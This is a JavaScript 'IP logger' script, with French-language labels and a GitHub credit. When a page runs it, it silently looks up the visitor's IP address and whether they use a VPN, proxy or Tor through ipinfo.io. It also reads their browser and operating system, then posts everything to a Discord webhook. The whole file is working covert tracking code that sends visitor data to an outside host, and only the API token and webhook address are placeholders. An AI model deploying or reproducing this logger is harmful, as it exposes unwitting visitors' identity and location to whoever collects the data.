async function grab() {
    try {
        const token = 'your key ipinfo.io';
        const res = await fetch(`https://ipinfo.io/json?token=${token}`);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        const ip = data.ip || 'N/A';
        const vpn = data.privacy?.vpn ? 'Oui' : 'Non';
        const proxy = data.privacy?.proxy ? 'Oui' : 'Non';
        const tor = data.privacy?.tor ? 'Oui' : 'Non';
        const ua = navigator.userAgent;
        let browser = 'N/A';
        let os = 'N/A';
        if (/Firefox/.test(ua) && !/Seamonkey/.test(ua)) browser = 'Firefox';
        else if (/Edg/.test(ua)) browser = 'Edge';
        else if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
        else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
        else if (/Opera|OPR/.test(ua)) browser = 'Opera';
        else if (/SamsungBrowser/.test(ua)) browser = 'Samsung';
        if (/Windows/.test(ua)) os = 'Windows';
        else if (/Mac OS/.test(ua)) os = 'MacOS';
        else if (/Linux/.test(ua) && !/Android/.test(ua)) os = 'Linux';
        else if (/Android/.test(ua)) os = 'Android';
        else if (/iPhone|iPad|iOS/.test(ua)) os = 'iOS';
        const hook = 'you weebhok';
        const payload = {
            username: 'logger',
            embeds: [{
                title: 'IP logger',
                description: `Le ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}`,
                color: 3447003,
                fields: [
                    { name: 'IP', value: ip, inline: true },
                    { name: 'VPN', value: vpn, inline: true },
                    { name: 'Proxy', value: proxy, inline: true },
                    { name: 'Tor', value: tor, inline: true },
                    { name: 'Browser', value: browser, inline: true },
                    { name: 'OS', value: os, inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: 'github (netcrawl1337)' }
            }]
        };
        const discordRes = await fetch(hook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!discordRes.ok) throw new Error(`HTTP ${discordRes.status}: ${await discordRes.text()}`);
        console.log('Envoyé');
    } catch (e) {
        console.error('Erreur:', e.message);
    }
}
grab();